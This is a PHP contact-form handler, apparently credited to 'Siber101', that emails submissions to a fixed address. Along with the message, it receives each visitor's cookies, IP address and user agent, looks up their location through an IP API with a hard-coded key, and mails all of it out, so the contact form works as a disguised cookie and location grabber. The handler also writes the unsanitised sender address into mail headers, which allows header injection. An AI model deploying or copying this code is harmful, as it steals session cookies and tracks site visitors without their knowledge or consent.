<!-- 
 Copyright 2025 Fatih Yılmaz

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
-->


<?php
// 
//
//
// Bu kodlar kullanılmadan önce bu kodların yükleneceği 
// php dosyasının konumu hazırlanmalıdır. 

$email_sent = null; // Başlangıçta null olarak ayarla

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Formdan gelen verileri al
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $comments = nl2br(htmlspecialchars($_POST['comments']));
    $user_ip = htmlspecialchars($_POST['user_ip']);
    $user_cookies = htmlspecialchars($_POST['user_cookies']);
    $user_agent = htmlspecialchars($_POST['user_agent']);

    // VPN API'yi kullanarak IP bilgilerini al
    $api_url = "https://vpnapi.io/api/{$user_ip}?key=fae51f6b493f431799f31551207c6914";
    $response = file_get_contents($api_url);
    $user_info = json_decode($response, true);  // JSON formatında cevap alıyoruz

    // JSON bilgilerini düz metin formatına çeviriyoruz
    $user_info_json = json_encode($user_info, JSON_PRETTY_PRINT);

    // E-posta bilgileri
    $to = "gecile8958@benznoi.com";
    $subject = "📩 Yeni İletişim Formu Mesajı - $name";

    // HTML e-posta içeriği
$message = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; color: #333; }
        .container { max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background: #f9f9f9; }
        h1 { background: #6C6C6C; color: white; padding: 8px; text-align: center; border-radius: 10px 10px 0 0; }
        h2 { background: #71A89E; color: white; padding: 8px; text-align: center; border-radius: 10px 10px 0 0; }
        p { margin: 10px 0; }
        strong { color: #007BFF; }
        a { color: #4C9600}
        .footer { font-size: 12px; color: #666; text-align: center; margin-top: 20px; }
        .footer h4 { font-size: 62px; font-family: 'Pirata One', cursive; }
        .footer b { font-family: 'Russo One', sans-serif; }
.btn-block {
    display: block;
    width: 100%;
}

    </style>
</head>
<body>
    <div class='container'>
        <h1 style='font-family:Arial;'>📧 Yeni E-Posta</h1>
        <h2 style='font-family:Arial;'>👥 Gönderen E-Postası</h2>
        <p><strong>🪪 Adı Soyadı :</strong> $name</p>
        <p><strong>📨 E-Posta :</strong> $email</p>
        <p><strong>📩 E-Posta Gönder :</strong> <a href='mailto:$email'>$email 'a e-posta gönderin</a></p>
        <p><strong>📝 Gönderenin Mesajı :</strong><br>$comments</p>
    <hr>
        <h2 style='font-family:Arial;'>🔍 Gönderen Bilgileri</h2>
        <p><strong>📍 Konum Bilgisi:</strong> <a href='https://www.ip2location.com/demo/$user_ip' target='_blank'>$name kişisinin konumu</a></p>
        <p><strong>🌐 IP Adresi:</strong> $user_ip</p>
        <p><strong>🍪 Çerezler:</strong> $user_cookies</p>
        <p><strong>👾 User-Agent:</strong> $user_agent</p>
    <hr>
        <h2 style='font-family:Arial;'>🛜 IP Içeriği (JSON)</h2>
        <p><br><pre>$user_info_json</pre></p>
        <div class='footer'>
    <hr>
<h5>Developed by <b style='color:#71A89E; font-family:'Pirata One', serif;'>Siber</b><b style='color:#000; font-family:'Russo One', sans-serif;'>101</b></h5>


        </div>
    </div>
</body>
</html>";

    // E-posta başlıkları
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "From: $email\r\n";
    $headers .= "Reply-To: $email\r\n";

    // Mail gönderme işlemi
    if (mail($to, $subject, $message, $headers)) {
        $response = ['status' => 'success', 'message' => 'Mesajınız başarıyla gönderildi.✅🎉 Teşekkür ederiz!'];
    } else {
        $response = ['status' => 'error', 'message' => 'Mesajınız gönderilemedi.❌😔 Lütfen tekrar deneyin.'];
    }

    // JSON formatında yanıt döndür
    echo json_encode($response);
    exit;
}
?>
